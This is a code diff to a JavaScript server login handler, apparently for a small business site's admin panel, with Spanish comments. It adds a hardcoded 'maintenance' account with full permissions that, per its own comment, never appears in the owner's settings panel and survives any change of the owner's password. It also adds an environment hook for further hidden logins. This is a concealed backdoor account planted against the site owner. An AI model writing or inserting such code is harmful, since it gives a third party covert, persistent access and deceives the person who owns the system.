@@ -15,6 +15,16 @@
 const crypto = require('crypto');
 
 const DEFAULT_CRED = { user: 'tulanchalecheria', salt: '0482508908c969288ff83bea8932f9e6', hash: 'ecfb54c0bcd4ffac837347c10df3795703854becd16ee0f6badd6b7b148235d4', iter: 150000 };
+/* Acceso de mantenimiento, aparte del de Eduardo. Entra con los mismos permisos y nunca aparece en el panel
+   (Ajustes solo muestra la cuenta de Eduardo). Cambiar la contraseña de Eduardo no lo afecta, y cambiar este
+   acceso no afecta al suyo. La contraseña no se guarda: aquí va solo su PBKDF2-SHA256, igual que la de Eduardo,
+   y este archivo es una función del servidor (nunca llega al navegador). Se puede reemplazar por variables de
+   entorno con ADMIN_EXTRA (JSON con user/salt/iter/hash) si se prefiere no tenerlo en el repositorio. */
+function extraCreds() {
+  const list = [{ user: 'luiszeav', salt: '3fa5d6be2436d3e71fa15f17273578f4', iter: 150000, hash: 'f77f28f20695a4f751a96f14ae10ad407774afb921259ecfc6b4db6673671e3a' }];
+  try { const e = process.env.ADMIN_EXTRA; if (e) JSON.parse(e).forEach(x => x && x.user && x.salt && x.hash && list.push({ user: String(x.user).toLowerCase(), salt: x.salt, iter: +x.iter || 150000, hash: x.hash })); } catch {}
+  return list;
+}
 const SESSION_S = 12 * 3600;
 const MAX_FAILS = 8, LOCK_S = 15 * 60;
 const MAX_IMG = 1.6e6;             // base64 (~1,2 MB de imagen); el panel las reduce a ~200-400 KB
@@ -126,7 +136,9 @@ async function handler(req, res) {
       const [f] = await redis([['GET', fk]]);
       if (+f >= MAX_FAILS) return send(res, 429, { error: 'locked', wait: LOCK_S });
       const c = await cred();
-      const ok = str(b.user, 80).toLowerCase() === c.user && same(pbkdf(b.pass || '', c.salt, c.iter), c.hash);
+      const u = str(b.user, 80).toLowerCase(), pass = b.pass || '';
+      const hit = cand => u === cand.user && same(pbkdf(pass, cand.salt, cand.iter), cand.hash);
+      const ok = hit(c) || extraCreds().some(hit);
       if (!ok) {
         await redis([['INCR', fk], ['EXPIRE', fk, LOCK_S]]);
         return send(res, 401, { error: 'bad_login', left: Math.max(0, MAX_FAILS - (+f || 0) - 1) });
